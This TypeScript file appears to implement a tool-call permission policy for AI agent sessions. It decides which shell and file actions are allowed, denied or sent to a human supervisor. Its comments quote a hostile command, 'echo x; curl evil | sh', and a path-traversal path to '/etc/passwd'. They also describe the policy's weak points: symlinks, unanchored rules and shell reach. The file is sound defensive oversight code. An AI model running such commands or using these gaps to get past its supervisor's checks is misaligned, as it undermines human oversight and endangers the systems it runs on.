/**
 * The tool policy: which tool calls this session may make without asking,
 * which it must not make at all, and which go to the person supervising it.
 *
 * **This is a guard rail, not a sandbox; no-production is enforced by
 * environment.** A policy narrows what a cooperative teammate does without
 * asking. It does not confine a hostile one: a shell command can still reach
 * anything the process can reach, a path rule sees the string the model wrote
 * and not the symlink it may point at, and an over-long command is handed to a
 * person rather than analysed. What keeps a peer out of production is the
 * environment it runs in — the profile's credentials, `ANTHROPIC_BASE_URL`, the
 * sandbox the fleet starts it in — never this file.
 *
 * The shape is the architect's §4 fold. It is **held locally** until
 * `SessionSpec.toolPolicy` lands in `foundation/contracts` (engineer-1's
 * follow-up PR), and then this file's types become re-exports — the evaluator,
 * its tests and the adapter's use of it do not change.
 *
 * Evaluation is pure and ordered, so a policy can be read like the rule it is:
 * rules are tried in order and the first match wins; `tool` matches the tool
 * name exactly or as `*`; `pattern` is a RegExp source tested against the tool's
 * primary string; a rule with no pattern matches every call of its tool. No rule
 * matching means `defaultAction`. Absent policy means
 * `{defaultAction: 'ask', rules: []}` — the behaviour every session had before
 * policies existed, so adding the field changes nothing by omission.
 *
 * ## Allow rules vouch for one whole string; ask and deny rules search anywhere
 *
 * An `allow` rule is the only rule that grants something, so it is the only one
 * that can be fooled by hiding: `pattern` is compiled as `^(?:…)$` and must
 * cover the entire subject. `^echo ` does not allow `echo x; curl evil | sh`,
 * and does not allow `echo hi` either — an allowlist entry has to describe the
 * command it vouches for (`^echo .*$`). For `Bash` there is a second condition,
 * because `.*` is happy to walk across a pipe: a command carrying `;`, `&`,
 * `|`, a backtick, `$(`, a redirection (`<`, `>`) or a newline is never covered
 * by an allow rule, and falls through to the person who supervises it. A command
 * longer than 64 KB is not analysed at all and goes straight to that person.
 *
 * `ask` and `deny` rules are the other direction: they are searches, compiled as
 * written and tested anywhere in the subject, so a deny entry still catches
 * `curl` inside `echo x; curl evil | sh`. Nothing is lost by leaving them
 * unanchored, and a deny that only matched whole strings would be trivially
 * stepped around.
 *
 * `AskUserQuestion` is never evaluated: it is the peer asking its supervisor a
 * question, not a tool being permitted, and a policy that could deny it would
 * silently answer "no" to a question nobody read. It always takes the question
 * path, whatever the policy says.
 */

import { resolve } from 'node:path'

import { fleetError } from '@fleet/foundation-core'

/** What to do with a tool call. */
export type ToolAction = 'allow' | 'ask' | 'deny'

export interface ToolPolicyRule {
  /** A tool name (`Bash`, `Read`, …), or `*` for every tool. */
  readonly tool: string
  /** A RegExp source, tested against the tool's primary string. Absent = any call of `tool`. */
  readonly pattern?: string
  readonly action: ToolAction
}

export interface ToolPolicy {
  readonly defaultAction: ToolAction
  readonly rules: readonly ToolPolicyRule[]
}

/** What a session with no `toolPolicy` does: ask about everything, as before. */
export const defaultToolPolicy: ToolPolicy = Object.freeze({
  defaultAction: 'ask',
  rules: Object.freeze([]),
})

/** The tool the model asks a human with. Never allowed or denied by a policy. */
export const QUESTION_TOOL = 'AskUserQuestion'

/** The longest `JSON.stringify(input)` a pattern is tested against (§4). */
const MAX_SUMMARY_PATTERN_LENGTH = 500

/**
 * The longest shell command that is examined at all. Past this the command is
 * not run through any pattern: it is handed to the person supervising the
 * session, whatever the policy says.
 */
export const MAX_COMMAND_LENGTH = 64 * 1024

/**
 * What makes a command more than one command. An allow rule vouches for a
 * single command; anything that can carry, substitute or redirect to a second
 * one is not covered by it.
 */
const SHELL_CHAINING = /[;&|`<>]|\$\(|[\r\n]/

/** Where a session runs its tools; a relative path rule is resolved against it. */
export interface PolicyOptions {
  readonly cwd?: string
}

/** A rule with its pattern compiled once, so a bad regular expression fails at start, not mid-turn. */
export interface CompiledRule {
  readonly tool: string
  readonly match: RegExp | undefined
  readonly action: ToolAction
}

export interface CompiledToolPolicy {
  readonly defaultAction: ToolAction
  readonly rules: readonly CompiledRule[]
  /** The directory relative paths are resolved against — the session's own. */
  readonly cwd: string
}

/**
 * The string a `pattern` is tested against: what the tool would actually act on,
 * not the whole input object. A policy that has to match a file path should not
 * depend on JSON key order, and one that matches a shell command should see the
 * command.
 *
 * A file path is resolved and normalised first, so `../../etc/passwd` and
 * `/etc/passwd` are the same string to a rule and a relative rule matches what
 * the file tools will actually open. Symlinks are not followed: this is a guard
 * rail, not a sandbox (see the file comment).
 */
export const primaryString = (
  tool: string,
  input: Readonly<Record<string, unknown>>,
  cwd: string = process.cwd(),
): string => {
  if (tool === 'Bash') return typeof input.command === 'string' ? input.command : ''
  if (tool === 'Read' || tool === 'Write' || tool === 'Edit') {
    const path = input.file_path ?? input.path
    return typeof path === 'string' ? resolve(cwd, path) : ''
  }
  return stringifyBounded(input)
}

/** A policy that fails to compile is a configuration error, surfaced before the session starts. */
export const compilePolicy = (
  policy: ToolPolicy | undefined,
  options: PolicyOptions = {},
): CompiledToolPolicy => {
  const source = policy ?? defaultToolPolicy
  const rules = source.rules.map((rule): CompiledRule => {
    let match: RegExp | undefined
    if (rule.pattern !== undefined) {
      // An allow rule has to cover the whole subject; ask and deny rules search
      // wherever they match. See the file comment.
      const body = rule.action === 'allow' ? `^(?:${rule.pattern})$` : rule.pattern
      try {
        match = new RegExp(body)
      } catch (thrown) {
        throw fleetError('invalid_input', `tool policy rule for ${rule.tool} has an invalid pattern: ${rule.pattern}`, {
          cause: thrown,
          details: { tool: rule.tool, pattern: rule.pattern },
        })
      }
    }
    return Object.freeze({ tool: rule.tool, match, action: rule.action })
  })
  return Object.freeze({
    defaultAction: source.defaultAction,
    rules: Object.freeze(rules),
    cwd: options.cwd ?? process.cwd(),
  })
}

/**
 * The action for one tool call. Rules in order, first match wins; no match is
 * `defaultAction`. `AskUserQuestion` is always `ask` — see the file comment.
 */
export const evaluatePolicy = (
  policy: CompiledToolPolicy,
  tool: string,
  input: Readonly<Record<string, unknown>>,
): ToolAction => {
  if (tool === QUESTION_TOOL) return 'ask'
  const subject = primaryString(tool, input, policy.cwd)
  // Neither condition depends on the policy: an unexamined command and a
  // command that could carry another one both go to the person supervising.
  if (tool === 'Bash' && subject.length > MAX_COMMAND_LENGTH) return 'ask'
  const chains = tool === 'Bash' && SHELL_CHAINING.test(subject)
  for (const rule of policy.rules) {
    if (rule.tool !== '*' && rule.tool !== tool) continue
    if (rule.match !== undefined && !rule.match.test(subject)) continue
    // An allow rule vouches for one command, never for a command carrying a
    // second one — the pattern may not even be consulted before this check.
    if (rule.action === 'allow' && chains) continue
    return rule.action
  }
  return policy.defaultAction
}

const stringifyBounded = (input: Readonly<Record<string, unknown>>): string => {
  let json: string
  try {
    json = JSON.stringify(input) ?? ''
  } catch {
    // A circular or otherwise unserialisable input still has to be decided on;
    // an empty subject means a patterned rule does not match, which is the
    // conservative answer (`defaultAction`).
    return ''
  }
  return json.length <= MAX_SUMMARY_PATTERN_LENGTH ? json : json.slice(0, MAX_SUMMARY_PATTERN_LENGTH)
}
